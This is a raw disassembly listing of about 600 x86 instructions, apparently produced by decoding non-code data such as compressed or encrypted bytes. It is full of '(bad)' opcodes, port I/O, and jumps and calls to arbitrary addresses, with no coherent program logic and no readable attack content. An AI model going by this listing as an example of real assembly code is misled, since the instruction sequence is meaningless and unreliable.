  40fc09:	mov    ch,0xc
  40fc0b:	xor    al,0x71
  40fc0d:	fisttp QWORD PTR [ebx-0x10910b91]
  40fc13:	(bad)  
  40fc16:	mov    ds,WORD PTR [esi]
  40fc18:	cld    
  40fc19:	mov    ch,0xcd
  40fc1b:	iret   
  40fc1c:	popf   
  40fc1d:	add    ah,ah
  40fc1f:	aad    0x37
  40fc21:	add    al,0x3e
  40fc23:	xor    edx,DWORD PTR [ebp+ebp*8-0x34]
  40fc27:	lods   eax,DWORD PTR ds:[esi]
  40fc28:	dec    eax
  40fc29:	fsubr  QWORD PTR [edx]
  40fc2b:	mov    dl,0x22
  40fc2d:	inc    edi
  40fc2e:	jge    0x40fc40
  40fc30:	shl    BYTE PTR [edx-0x50],cl
  40fc33:	jp     0x40fc48
  40fc35:	shr    esi,0xce
  40fc38:	shl    DWORD PTR [esp+ebp*1+0x15809390],0xa9
  40fc40:	jle    0x40fbd3
  40fc42:	or     DWORD PTR [ebp-0x58],eax
  40fc45:	daa    
  40fc46:	sbb    dh,BYTE PTR [edx+0x58d8e46e]
  40fc4c:	stos   BYTE PTR es:[edi],al
  40fc4d:	stos   BYTE PTR es:[edi],al
  40fc4e:	imul   DWORD PTR [ebx-0x29]
  40fc51:	fisubr WORD PTR [ecx]
  40fc53:	leave  
  40fc54:	adc    al,0xc2
  40fc56:	fld    DWORD PTR [ebx]
  40fc58:	push   ebp
  40fc59:	inc    ebx
  40fc5a:	adc    dl,cl
  40fc5c:	cmp    eax,0xa17cb664
  40fc61:	daa    
  40fc62:	mov    al,0xbd
  40fc64:	mov    ebx,0xa08ad61c
  40fc69:	mov    edi,0x596d666a
  40fc6e:	pop    eax
  40fc6f:	xchg   esp,eax
  40fc70:	inc    ecx
  40fc71:	push   cs
  40fc72:	mov    ebx,0xcdd281b4
  40fc77:	or     al,0x97
  40fc79:	daa    
  40fc7a:	lea    edi,[ebp+0x79]
  40fc7d:	xlat   BYTE PTR ds:[ebx]
  40fc7e:	jae    0x40fcbe
  40fc80:	iret   
  40fc81:	cld    
  40fc82:	jl     0x40fc4d
  40fc84:	push   ebx
  40fc85:	push   ss
  40fc86:	sbb    edi,DWORD PTR [edi-0x75]
  40fc89:	push   edx
  40fc8a:	mov    eax,0x362be18c
  40fc8f:	pop    esi
  40fc90:	iret   
  40fc91:	mov    ah,0x42
  40fc93:	jl     0x40fc23
  40fc95:	out    dx,al
  40fc96:	sbb    esp,DWORD PTR [eax]
  40fc98:	push   ebx
  40fc99:	ins    DWORD PTR es:[edi],dx
  40fc9a:	imul   esi,DWORD PTR [edx+0x57],0x520776fb
  40fca1:	call   0x1978de21
  40fca6:	test   DWORD PTR [eax-0x4],ebp
  40fca9:	jecxz  0x40fc6a
  40fcab:	jno    0x40fc57
  40fcad:	and    eax,0xab219115
  40fcb2:	push   ecx
  40fcb3:	hlt    
  40fcb4:	loop   0x40fcf7
  40fcb6:	rol    DWORD PTR [ecx+0x7],1
  40fcb9:	sub    al,0x51
  40fcbb:	dec    edx
  40fcbc:	pop    ebp
  40fcbd:	shl    BYTE PTR [ebp+0x31],cl
  40fcc0:	jp     0x40fd24
  40fcc2:	add    DWORD PTR [ecx-0x7826bec3],edx
  40fcc8:	mov    dh,0xd6
  40fccb:	stos   DWORD PTR es:[edi],eax
  40fccc:	mov    cl,0xda
  40fcce:	mov    edx,0x7674691e
  40fcd3:	sub    DWORD PTR [ecx+0x33c28c4a],ebx
  40fcd9:	sar    esi,cl
  40fcdb:	adc    eax,0x3af76c6d
  40fce0:	gs adc al,0x20
  40fce3:	fadd   st(5),st
  40fce5:	in     al,0xb2
  40fce7:	stos   BYTE PTR es:[edi],al
  40fce8:	int3   
  40fce9:	or     BYTE PTR [edx+edi*4-0x14],bl
  40fced:	aad    0x9c
  40fcef:	je     0x40fd54
  40fcf1:	test   BYTE PTR [edi-0x70fe9a7f],0x81
  40fcf8:	cmp    al,BYTE PTR [esi]
  40fcfa:	(bad)  [edx-0x782e272d]
  40fd00:	arpl   WORD PTR [ebp-0x7],sp
  40fd03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd04:	pop    ebp
  40fd05:	scas   eax,DWORD PTR es:[edi]
  40fd06:	jae    0x40fd59
  40fd08:	pop    eax
  40fd09:	adc    al,0x73
  40fd0b:	shl    DWORD PTR [ecx+0x62],0x17
  40fd0f:	mov    DWORD PTR [ecx+edi*4],0x8a8a02c1
  40fd16:	pop    ebp
  40fd17:	jo     0x40fcd2
  40fd19:	std    
  40fd1a:	stos   BYTE PTR es:[edi],al
  40fd1b:	(bad)  
  40fd1c:	imul   esi,DWORD PTR [esi],0xa95a7f2b
  40fd22:	into   
  40fd23:	push   ds
  40fd24:	shl    BYTE PTR [ebx+0x2e7da8bb],1
  40fd2a:	ja     0x40fd85
  40fd2c:	int    0xac
  40fd2e:	xchg   BYTE PTR [ebx+0x283fbac3],ch
  40fd34:	inc    ebx
  40fd35:	cmp    bl,bh
  40fd37:	cmp    DWORD PTR [edx-0x384ec52],ebp
  40fd3d:	xchg   ecx,eax
  40fd3e:	push   esp
  40fd3f:	or     al,0x76
  40fd41:	ds sbb eax,0x12755382
  40fd47:	sub    eax,0x2a980486
  40fd4c:	jle    0x40fda4
  40fd4e:	mov    eax,ds:0x78ed892b
  40fd53:	adc    BYTE PTR [edx],al
  40fd55:	inc    eax
  40fd56:	add    edx,DWORD PTR [ebp-0x20]
  40fd59:	dec    esi
  40fd5a:	sahf   
  40fd5b:	pop    ebp
  40fd5c:	inc    esp
  40fd5d:	dec    esi
  40fd5e:	pop    ss
  40fd5f:	add    esp,DWORD PTR [ebp-0x76]
  40fd62:	push   edx
  40fd63:	cmc    
  40fd64:	dec    esi
  40fd65:	inc    ecx
  40fd66:	sbb    al,0x96
  40fd68:	mov    bl,0xa
  40fd6a:	cli    
  40fd6b:	nop
  40fd6c:	mov    esp,0x12ed7b58
  40fd71:	ret    
  40fd72:	xchg   esp,eax
  40fd73:	out    dx,al
  40fd74:	das    
  40fd75:	fild   DWORD PTR [esi]
  40fd77:	les    edi,FWORD PTR [edx+0x23]
  40fd7a:	sub    al,0xa3
  40fd7c:	jns    0x40fd70
  40fd7e:	cmp    DWORD PTR [ebp-0x53],ecx
  40fd81:	fsubr  QWORD PTR [ecx-0x3a5dea3c]
  40fd87:	xchg   ebp,eax
  40fd88:	jmp    0x225be31e
  40fd8d:	mov    bl,0xc9
  40fd8f:	(bad)  
  40fd90:	out    dx,al
  40fd91:	shr    DWORD PTR [edx+esi*2-0x33103cda],0xca
  40fd99:	idiv   BYTE PTR [edi+edi*2-0x80]
  40fd9d:	dec    ebx
  40fd9e:	popf   
  40fd9f:	jo     0x40fd7b
  40fda1:	lahf   
  40fda2:	pop    esp
  40fda3:	sbb    ebx,eax
  40fda5:	out    dx,eax
  40fda6:	cmp    al,0xf3
  40fda8:	stc    
  40fda9:	mov    WORD PTR [ebx],ss
  40fdab:	cld    
  40fdac:	popa   
  40fdad:	icebp  
  40fdae:	sbb    cl,cl
  40fdb0:	push   DWORD PTR [ecx+0x13]
  40fdb3:	mov    ch,0x68
  40fdb5:	jmp    0x4b9d1eb0
  40fdba:	lds    ecx,FWORD PTR [ebx]
  40fdbc:	push   ss
  40fdbd:	jge    0x40fd70
  40fdbf:	add    ecx,DWORD PTR [esi]
  40fdc1:	popa   
  40fdc2:	mov    edi,0x2b3cd88f
  40fdc7:	test   al,0xbb
  40fdc9:	hlt    
  40fdca:	int    0x50
  40fdcc:	jle    0x40fd86
  40fdce:	xchg   edx,esi
  40fdd0:	mov    edx,0x45de28c
  40fdd5:	outs   dx,BYTE PTR ds:[esi]
  40fdd6:	out    0xfe,eax
  40fdd8:	xchg   ecx,eax
  40fdd9:	push   edi
  40fdda:	inc    edx
  40fddb:	test   eax,0x351f61ac
  40fde0:	repnz cmp DWORD PTR [ecx-0x3c3b0f6c],ecx
  40fde7:	push   cs
  40fde8:	mov    al,ds:0xb289a2cf
  40fded:	ffree  st(7)
  40fdef:	in     al,dx
  40fdf0:	mov    ds:0x18e01859,eax
  40fdf5:	shl    ch,cl
  40fdf7:	xor    esp,ecx
  40fdf9:	test   al,0x8e
  40fdfb:	outs   dx,DWORD PTR ds:[esi]
  40fdfc:	push   ds
  40fdfd:	fnstsw WORD PTR [ecx+0x33d042b4]
  40fe03:	cmp    ah,dh
  40fe05:	lods   eax,DWORD PTR ds:[esi]
  40fe06:	(bad)  [esi]
  40fe08:	mov    ebp,0xcb1b114a
  40fe0d:	jno    0x40fda9
  40fe0f:	dec    eax
  40fe10:	into   
  40fe11:	push   esp
  40fe12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe13:	pop    edx
  40fe14:	mov    ds:0xdc7cab3,al
  40fe19:	neg    BYTE PTR [edx]
  40fe1b:	std    
  40fe1c:	dec    esp
  40fe1d:	test   edi,ebp
  40fe1f:	call   0x83ad:0xa7ed1ac5
  40fe26:	js     0x40fe25
  40fe28:	test   BYTE PTR [ecx],ah
  40fe2a:	ds mov ah,0x4e
  40fe2d:	dec    eax
  40fe2e:	pop    esi
  40fe2f:	mov    dh,0x91
  40fe31:	pcmpgtd mm4,QWORD PTR [edx]
  40fe34:	xor    eax,0xa518b2b3
  40fe39:	and    edi,DWORD PTR [edi-0x64]
  40fe3c:	fidivr WORD PTR ds:[ebx-0x885f7db]
  40fe43:	neg    BYTE PTR [edx+0x35c5c3e8]
  40fe49:	sbb    al,0x52
  40fe4b:	or     esp,esp
  40fe4d:	jbe    0x40fe5f
  40fe4f:	adc    BYTE PTR [eax+0x9e8ae40],0xc3
  40fe56:	jp     0x40fe38
  40fe58:	push   edi
  40fe59:	mov    bh,0x12
  40fe5b:	std    
  40fe5c:	inc    eax
  40fe5d:	pop    es
  40fe5e:	stc    
  40fe5f:	shr    DWORD PTR [eax],1
  40fe61:	fidiv  WORD PTR es:[edx-0x64]
  40fe65:	ror    BYTE PTR [ecx],0x3c
  40fe68:	sub    BYTE PTR [ebp-0x64],0xf7
  40fe6c:	sbb    eax,0x78caa079
  40fe71:	out    0x35,al
  40fe73:	xchg   esp,eax
  40fe74:	mov    eax,ds:0x5ad29b34
  40fe79:	adc    ebp,ebx
  40fe7b:	test   al,0xdb
  40fe7d:	out    dx,eax
  40fe7e:	mov    ecx,0xdc823732
  40fe83:	inc    ebx
  40fe84:	test   al,0xe8
  40fe86:	call   0x6a593554
  40fe8b:	aaa    
  40fe8c:	mov    ds:0x5af94b57,eax
  40fe91:	pop    edx
  40fe92:	out    dx,eax
  40fe93:	mov    dh,0xca
  40fe95:	rcr    BYTE PTR ds:0x977eb923,0xcb
  40fe9c:	pop    DWORD PTR [ebp-0x37]
  40fe9f:	jb     0x40fe76
  40fea1:	jg     0x40febc
  40fea3:	stc    
  40fea4:	push   eax
  40fea5:	mov    bh,0xb2
  40fea7:	push   ecx
  40fea8:	lahf   
  40fea9:	mov    dl,0xa9
  40feab:	in     al,0xa0
  40fead:	fisubr WORD PTR [ecx-0x5a]
  40feb0:	adc    bl,BYTE PTR [ebx]
  40feb2:	cmc    
  40feb3:	sub    BYTE PTR [ebp-0x549c35b6],ch
  40feb9:	dec    esp
  40feba:	dec    esi
  40febb:	jmp    0x40fea4
  40febd:	push   edx
  40febe:	bound  edi,QWORD PTR [esp+ebp*2-0x1be0ae95]
  40fec5:	pop    es
  40fec6:	int    0x6
  40fec8:	mov    dh,0x47
  40feca:	mov    eax,ds:0x4b81377e
  40fecf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fed0:	aas    
  40fed1:	out    0x99,al
  40fed3:	ja     0x40fe64
  40fed5:	out    dx,al
  40fed6:	int3   
  40fed7:	inc    ecx
  40fed8:	jae    0x40fea7
  40feda:	and    BYTE PTR [ebx+0x1cf1109f],0xa2
  40fee1:	mov    eax,ds:0xee5af179
  40fee6:	int    0x39
  40fee8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fee9:	ss mov bl,0x5f
  40feec:	(bad)  
  40feee:	(bad)  
  40fef0:	fcmovu st,st(2)
  40fef2:	push   eax
  40fef3:	int3   
  40fef4:	ret    0xfb62
  40fef7:	push   es
  40fef8:	cdq    
  40fef9:	in     eax,0x50
  40fefb:	shr    BYTE PTR [ebp-0x520caa09],0xa7
  40ff02:	pop    ecx
  40ff03:	or     eax,0xe999d912
  40ff08:	add    eax,0xe60dc609
  40ff0d:	jne    0x40fec6
  40ff0f:	idiv   DWORD PTR [ebp-0x64a713c6]
  40ff15:	xor    ecx,ecx
  40ff17:	add    al,0x85
  40ff19:	(bad)  
  40ff1a:	lahf   
  40ff1b:	loop   0x40ff9c
  40ff1d:	dec    edx
  40ff1e:	push   ebx
  40ff1f:	sbb    cl,BYTE PTR [edx]
  40ff21:	push   eax
  40ff22:	(bad)  
  40ff23:	mov    ebx,0x1457a182
  40ff28:	adc    edi,DWORD PTR [eax+0x49]
  40ff2b:	add    cl,BYTE PTR [ebx+0x73]
  40ff2e:	(bad)  
  40ff2f:	clc    
  40ff30:	xchg   ecx,eax
  40ff31:	shr    DWORD PTR [ebx-0x3f],1
  40ff34:	and    eax,0xc5567d9b
  40ff39:	lds    ebx,FWORD PTR [ebp+edx*1+0x1]
  40ff3d:	imul   esi,DWORD PTR [edi+0x3eef2273],0xffffffe5
  40ff44:	push   ecx
  40ff45:	ficomp DWORD PTR [ebp-0x7d]
  40ff48:	(bad)  
  40ff49:	rol    esi,1
  40ff4b:	in     eax,0x33
  40ff4d:	lea    ebp,[ecx-0x16]
  40ff50:	cs xchg eax,ebp
  40ff53:	lahf   
  40ff54:	and    DWORD PTR [edx],esp
  40ff56:	adc    DWORD PTR [eax-0x752580fe],ebp
  40ff5c:	repnz push edi
  40ff5e:	lods   al,BYTE PTR ds:[esi]
  40ff5f:	sub    DWORD PTR [ecx+0x76707e81],ecx
  40ff65:	out    0xff,al
  40ff67:	mov    bl,0xed
  40ff69:	add    BYTE PTR [ebx-0x6b],al
  40ff6c:	jmp    0xef7c:0x8951df0c
  40ff73:	ret    0xb0fa
  40ff76:	push   esi
  40ff77:	stc    
  40ff78:	xor    esp,ebp
  40ff7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff7b:	adc    ah,BYTE PTR [edx+0x43f12dad]
  40ff81:	cmp    BYTE PTR [di-0x596a],0x2d
  40ff87:	imul   edi,eax,0xffffffed
  40ff8a:	adc    BYTE PTR [eax],0x34
  40ff8d:	sub    edi,edi
  40ff8f:	loop   0x40ff17
  40ff91:	add    BYTE PTR [ebx+0x7d4944b6],0x63
  40ff98:	push   0x1f676532
  40ff9d:	add    DWORD PTR [edx+0x9a7c76d],eax
  40ffa3:	push   ebp
  40ffa4:	sbb    eax,0x8b1b946a
  40ffa9:	mov    dh,0x61
  40ffab:	out    dx,al
  40ffac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffad:	retf   
  40ffae:	xor    DWORD PTR [eax+ecx*4+0x30],esp
  40ffb2:	cmc    
  40ffb3:	mov    ebp,0x44f7067e
  40ffb8:	adc    ebx,DWORD PTR [ebx]
  40ffba:	or     al,0x90
  40ffbc:	dec    esi
  40ffbd:	jnp    0x40ff5b
  40ffbf:	mov    ds:0xf2cc514e,al
  40ffc4:	pop    edi
  40ffc5:	xchg   esi,eax
  40ffc6:	pop    esi
  40ffc7:	pop    ss
  40ffc8:	test   eax,0xc17adc36
  40ffcd:	bound  edi,QWORD PTR [ebp+ebp*2-0x4]
  40ffd1:	mov    esp,ebp
  40ffd3:	inc    edi
  40ffd4:	pushf  
  40ffd5:	jbe    0x41004c
  40ffd7:	test   eax,0x6fbba0b6
  40ffdc:	adc    eax,0xd50e809a
  40ffe1:	iret   
  40ffe2:	pop    esp
  40ffe3:	mov    dh,0x41
  40ffe5:	dec    esp
  40ffe6:	pop    ecx
  40ffe7:	dec    edx
  40ffe8:	mov    ah,0xb8
  40ffea:	xor    DWORD PTR [edi],0xffffff85
  40ffed:	ja     0x40ffb6
  40ffef:	stos   DWORD PTR es:[edi],eax
  40fff0:	into   
  40fff1:	push   ebp
  40fff2:	jb     0x410039
  40fff4:	mov    ebp,DWORD PTR [ebp+0x4a25950e]
  40fffa:	(bad)  
  40fffb:	leave  
  40fffc:	fst    QWORD PTR ds:0xdf6b6858
  410002:	sbb    eax,0x7be8211d
  410007:	shr    BYTE PTR [ecx],1
  410009:	and    eax,0x298e2dbc
  41000e:	fcmovne st,st(3)
  410010:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410011:	stos   DWORD PTR es:[edi],eax
  410012:	xchg   esp,eax
  410013:	xchg   ebx,edi
  410015:	inc    esp
  410016:	jge    0x41002d
  410018:	repz and DWORD PTR [ebx],edi
  41001b:	add    al,bl
  41001d:	sub    ebp,DWORD PTR ds:0xa067ecc7
  410023:	push   esp
  410024:	push   esi
  410025:	sbb    eax,0x8be1558d
  41002a:	std    
  41002b:	mov    bl,dl
  41002d:	jbe    0x4100a9
  41002f:	dec    edx
  410030:	dec    esi
  410031:	jg     0x4100af
  410033:	not    DWORD PTR [edx]
  410035:	add    al,0x96
  410037:	dec    eax
  410038:	inc    edi
  410039:	addr16 mov dh,0x54
  41003c:	mov    ebp,0x2de727d8
  410041:	mov    DWORD PTR [eax-0x7],esi
  410044:	neg    DWORD PTR [esi]
  410046:	idiv   bh
  410048:	or     DWORD PTR [esi],esp
  41004a:	push   esp
  41004b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41004c:	sar    DWORD PTR [esi+eax*8+0x754a1613],1
  410053:	mov    bh,0x4b
  410055:	rep ins DWORD PTR es:[edi],dx
  410057:	xor    DWORD PTR [ebx],eax
  410059:	out    dx,eax
  41005a:	jnp    0x4100d7
  41005c:	lds    edi,FWORD PTR [ecx+0x5]
  41005f:	jle    0x410068
  410061:	fadd   DWORD PTR ds:0xbc6fb180
  410067:	jns    0x410062
  410069:	cmp    DWORD PTR [edi+edi*2],edi
  41006c:	test   al,0x1b
  41006e:	call   0x6e38c35a
  410073:	adc    ebp,edi
  410075:	or     eax,0x26a5363c
  41007a:	mov    ebp,0x92afd72d
  41007f:	pop    edi
  410080:	sub    ecx,ebp
  410082:	and    esp,DWORD PTR [ecx+0x457745b]
  410088:	cmp    eax,0xe493b92
  41008d:	cmp    ebx,DWORD PTR [eax+ebp*1+0x453a92ab]
  410094:	nop
  410095:	int3   
  410096:	cmp    edx,DWORD PTR ss:[edi+0x52]
  41009a:	outs   dx,BYTE PTR ds:[esi]
  41009b:	mov    esi,0x64851f00
  4100a0:	adc    al,0xb0
  4100a2:	mov    dh,BYTE PTR [edx]
  4100a4:	pop    ebp
  4100a5:	mov    cl,0x25
  4100a7:	cmp    BYTE PTR [esi],0x69
  4100aa:	xchg   DWORD PTR gs:[esi],edi
  4100ad:	jno    0x410059
  4100af:	adc    cl,BYTE PTR [edi-0x3dd63f89]
  4100b5:	sub    eax,0xdaa8b6a2
  4100ba:	fistp  WORD PTR [esi+0x2699a006]
  4100c0:	pop    esi
  4100c1:	jmp    0x410077
  4100c3:	fmul   QWORD PTR [ebp+0x34ea2a13]
  4100c9:	xchg   BYTE PTR [edi],dl
  4100cb:	rol    BYTE PTR [ebp*8+0x509721e6],0x14
  4100d3:	pop    ss
  4100d4:	push   0x62f4d3d6
  4100d9:	test   BYTE PTR [ecx+eiz*8],ch
  4100dc:	ss pop ds
  4100de:	jle    0x4100f4
  4100e0:	mov    ecx,DWORD PTR [ebp+0xe]
  4100e3:	jmp    0x2a6265a1
  4100e8:	jmp    0x41015d
  4100ea:	sbb    al,0x8a
  4100ec:	add    al,0x15
  4100ee:	mov    ch,0xa2
  4100f0:	adc    eax,0x5b1494c5
  4100f5:	inc    ecx
  4100f6:	jle    0x410166
  4100f8:	gs (bad) 
  4100fa:	cli    
  4100fb:	xchg   edx,eax
  4100fc:	mov    dh,0x39
  4100fe:	out    0xe0,eax
  410100:	fst    QWORD PTR gs:[ecx]
  410103:	cdq    
  410104:	jp     0x41013f
  410106:	pop    es
  410107:	push   ecx
  410108:	or     DWORD PTR [ecx],esi
  41010a:	jbe    0x4100a7
  41010c:	jb     0x4100ce
  41010e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410110:	in     eax,dx
  410111:	out    0xa4,al
  410113:	pusha  
  410114:	jp     0x4100c7
  410116:	inc    ebx
  410117:	add    al,0xb4
  410119:	mov    eax,ds:0x10394918
  41011e:	scas   eax,DWORD PTR es:[edi]
  41011f:	mov    edi,0x3a3f47eb
  410124:	xchg   esi,eax
  410125:	and    al,0xba
  410127:	aas    
  410128:	sbb    DWORD PTR [esi],ebx
  41012a:	in     eax,dx
  41012b:	push   esi
  41012c:	pop    ecx
  41012d:	push   es
  41012e:	mov    WORD PTR [ecx],ss
  410130:	push   0x50
  410132:	dec    edx
  410133:	xlat   BYTE PTR ds:[ebx]
  410134:	out    dx,al
  410135:	jmp    0x8f01101b
  41013a:	mov    esi,0x971ef05b
  41013f:	adc    ebp,edx
  410141:	jo     0x410183
  410143:	mov    ebx,0x454de3bf
  410148:	jnp    0x410119
  41014a:	lds    ebp,FWORD PTR ds:0x179dfd85
  410150:	mov    al,0xb3
  410152:	aad    0x89
  410154:	ror    DWORD PTR [edx+0x41],0xc6
  410158:	xchg   DWORD PTR [esi],ecx
  41015a:	ret    0xd0c0
  41015d:	pop    ss
  41015e:	loope  0x4100ff
  410160:	push   edx
  410161:	jno    0x4101df
  410163:	jecxz  0x410152
  410165:	loop   0x41014f
  410167:	pop    edx
  410168:	dec    ebx
  410169:	loopne 0x410119
  41016b:	lea    ebx,[ebx-0x66ce9f81]
  410171:	iret   
  410172:	ss or  cl,al
  410175:	clc    
  410176:	shl    BYTE PTR [ecx-0x41147889],1
  41017c:	es pop esi
  41017e:	ins    BYTE PTR es:[edi],dx
  41017f:	lea    esi,[esi+0x77]
  410182:	sti    
  410183:	lahf   
  410184:	and    eax,0x9b687a15
  410189:	fs into 
  41018b:	inc    esp
  41018c:	sub    dl,ah
  41018e:	cli    
  41018f:	mov    al,ds:0x4d6ddbd8
  410194:	imul   esp,DWORD PTR [edx+edx*4+0x1a],0x5da60d29
  41019c:	push   0x60
  41019e:	add    dl,BYTE PTR [edx]
  4101a0:	shr    edx,1
  4101a2:	sbb    BYTE PTR [ebx+0x6e56feba],ah
  4101a8:	sbb    al,BYTE PTR [esi-0x60]
  4101ab:	adc    eax,0x7687a2ea
  4101b0:	es inc edi
  4101b2:	sub    al,0xf8
  4101b4:	push   eax
  4101b5:	xor    BYTE PTR [eax],ch
  4101b7:	cmp    DWORD PTR [esi-0x662f6bc8],ecx
  4101bd:	push   cs
  4101be:	rcl    eax,cl
  4101c0:	aaa    
  4101c1:	and    ebp,DWORD PTR [esi-0x64]
  4101c4:	ss sahf 
  4101c6:	xchg   DWORD PTR [ecx],esp
  4101c8:	mov    ecx,0x788dedb0
  4101cd:	pop    ss
  4101ce:	jmp    0x4101ab
  4101d0:	sar    BYTE PTR [ebx-0x5670f2b7],cl
  4101d6:	nop
  4101d7:	and    bl,bl
  4101d9:	add    eax,0xb2ca94ee
  4101de:	lahf   
  4101df:	push   es
  4101e0:	jne    0x4101a6
  4101e2:	sub    DWORD PTR [eax-0x4ca00650],ebp
  4101e8:	(bad)  
  4101ea:	loope  0x41023b
  4101ec:	and    ebp,DWORD PTR [edi]
  4101ee:	das    
  4101ef:	out    dx,al
  4101f0:	dec    eax
  4101f1:	in     eax,dx
  4101f2:	test   DWORD PTR [eax+eax*8],eax
  4101f5:	mov    dh,0x60
  4101f7:	push   cs
  4101f8:	xor    al,0xcd
  4101fa:	sub    ch,bh
  4101fc:	pop    esp
  4101fd:	dec    ecx
  4101fe:	push   edx
  4101ff:	sub    esp,ecx
  410201:	test   al,0xf5
  410203:	popf   
  410204:	pushf  
  410205:	inc    edi
  410206:	push   ss
  410207:	bound  ebx,QWORD PTR [ebp-0x4d]
  41020a:	and    BYTE PTR [eax],dh
  41020c:	fsub   st(5),st
  41020e:	paddd  mm4,mm7
  410211:	and    al,0x1c
  410213:	dec    esp
  410214:	ret    0xbf4c
  410217:	std    
  410218:	xchg   ebx,eax
  410219:	test   DWORD PTR [edx-0x33d6816a],edi
  41021f:	ds jne 0x410231
  410222:	and    DWORD PTR [esp+esi*4+0x68],edx
  410226:	cmp    al,0x95
  410228:	xor    BYTE PTR [ecx-0x3],bl
  41022b:	popf   
  41022c:	inc    esp
  41022d:	nop    esi
  410230:	jmp    0x4101c7
  410232:	jnp    0x41028e
  410234:	or     al,al
  410236:	popa   
  410237:	adc    ch,0xa2
  41023a:	scas   eax,DWORD PTR es:[edi]
  41023b:	int    0xc7
  41023d:	sbb    BYTE PTR [esi],al
  41023f:	inc    esp
  410240:	add    cl,dh
  410242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410243:	iret   
  410244:	xor    eax,0x54f66870
  410249:	lea    edi,[edx+ecx*2]
  41024c:	arpl   WORD PTR [ebx+ebx*2-0x1af76016],bx
  410253:	hlt    
  410254:	dec    BYTE PTR [esi-0x23fc2990]
  41025a:	push   ss
  41025b:	(bad)  
  41025c:	mov    BYTE PTR [eax-0x52ef53c2],dh
  410262:	ins    DWORD PTR es:[edi],dx
  410263:	enter  0x92cd,0xd2
  410267:	xchg   ecx,eax
  410268:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410269:	mov    ds,esi
  41026b:	sbb    al,0xe9
  41026d:	sti    
  41026e:	pushf  
  41026f:	enter  0xa8e2,0xd8
  410273:	jno    0x410221
  410275:	test   bl,0xe1
  410278:	stos   DWORD PTR es:[edi],eax
  410279:	dec    esp
  41027a:	cmp    al,0x52
  41027c:	call   0x5788043e
  410281:	xchg   ebx,eax
  410282:	shr    BYTE PTR [edx-0x12],0x31
  410286:	repnz data16 (bad) 
  410289:	outs   dx,DWORD PTR ds:[esi]
  41028a:	fldcw  WORD PTR [eax+edi*1-0x698fa8cc]
  410291:	outs   dx,DWORD PTR ds:[esi]
  410292:	loope  0x4102bf
  410294:	imul   esp,DWORD PTR [eax+0x62],0xf856fc26
  41029b:	or     dl,BYTE PTR [edi+0x7d]
  41029e:	ret    
  41029f:	add    DWORD PTR [edi-0x1ea6d0c7],esi
  4102a5:	or     eax,DWORD PTR [edi-0x31]
  4102a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102a9:	and    BYTE PTR [eax+0x764827bf],0xef
  4102b0:	lea    edx,[edi+0x1899f894]
  4102b6:	xchg   DWORD PTR [esi-0xb83cb61],ebp
  4102bc:	retf   0x1b9
  4102bf:	cmp    al,0xd9
  4102c1:	inc    eax
  4102c2:	dec    ebp
  4102c3:	fisubr WORD PTR [ebp-0x778d504b]
  4102c9:	cli    
  4102ca:	fcom   DWORD PTR [ecx-0x58a336a7]
  4102d0:	push   ds
  4102d1:	call   0xa34c6690
  4102d6:	or     BYTE PTR ds:0xf039843,al
  4102dc:	adc    eax,0x44caf9fb
  4102e1:	out    dx,eax
  4102e2:	adc    eax,DWORD PTR [ebp-0x15]
  4102e5:	sub    ch,BYTE PTR [ebp-0x13]
  4102e8:	ins    BYTE PTR es:[edi],dx
  4102e9:	sub    eax,0x43a00643
  4102ee:	sub    ebx,edi
  4102f0:	fxam   
  4102f2:	les    esp,FWORD PTR ds:0x9f21686f
  4102f8:	icebp  
  4102f9:	stos   BYTE PTR es:[edi],al
  4102fa:	js     0x4102bd
  4102fc:	call   0xa458eb93
  410301:	sbb    al,0x8b
  410303:	pop    ecx
  410304:	inc    edx
  410305:	push   ebp
  410306:	mov    ebp,0x7a89da2
  41030b:	jne    0x41038c
  41030d:	xor    BYTE PTR [ecx+esi*8-0x15bac986],dl
  410314:	repz cli 
  410316:	jne    0x410352
  410318:	mov    esp,0x42bac822
  41031d:	inc    ebp
  41031e:	jp     0x4102fe
  410320:	imul   esp,DWORD PTR [ebx+0x50],0x47
  410324:	(bad)  
  410326:	jb     0x41036b
  410328:	shl    DWORD PTR [eax+0x7237acc1],cl
  41032e:	imul   ecx,DWORD PTR ds:0x98b3c8a8,0x5a
  410335:	lods   eax,DWORD PTR ds:[esi]
  410336:	xor    ah,BYTE PTR [ecx+0x65d3f8d3]
  41033c:	sub    bh,BYTE PTR [esp+eax*4-0x53]
  410340:	mov    ebp,0x5a392a14
  410345:	sti    
  410346:	xor    BYTE PTR [ebp-0x65],cl
  410349:	sub    DWORD PTR [eax-0x23160d8b],ebx
  41034f:	pop    eax
  410350:	and    BYTE PTR [edi+0x334499e5],ah
  410356:	leave  
  410357:	mov    dh,0x71
  410359:	cmp    eax,0x4457a280
  41035e:	ds call 0x7211:0x71ba0924
  410366:	stos   DWORD PTR es:[edi],eax
  410367:	(bad)  
  410368:	aam    0xe4
  41036a:	popa   
  41036b:	mov    edx,0x763820d4
  410370:	addr16 loopne 0x410356
  410373:	(bad)  
  410374:	jno    0x41030d
  410376:	hlt    
  410377:	cmc    
  410378:	das    
  410379:	ins    DWORD PTR es:[edi],dx
  41037a:	push   eax
  41037b:	out    0xbf,eax
  41037d:	pushf  
  41037e:	pop    esp
  41037f:	aas    
  410380:	ret    
  410381:	adc    eax,0x34f28085
  410386:	lahf   
  410387:	mov    dl,0xdd
  410389:	ds mov dl,0xb
  41038c:	in     al,0x84
  41038e:	jns    0x410400
  410390:	sahf   
  410391:	(bad)  
  410393:	aad    0x83
  410395:	shr    bh,1
  410397:	dec    edi
  410398:	(bad)  
  410399:	jmp    0x503b2c3d
  41039e:	sub    al,bh
  4103a0:	and    BYTE PTR [ecx+0x6d8408ec],0xd
  4103a7:	pop    es
  4103a8:	and    al,0xb6
  4103aa:	test   al,ah
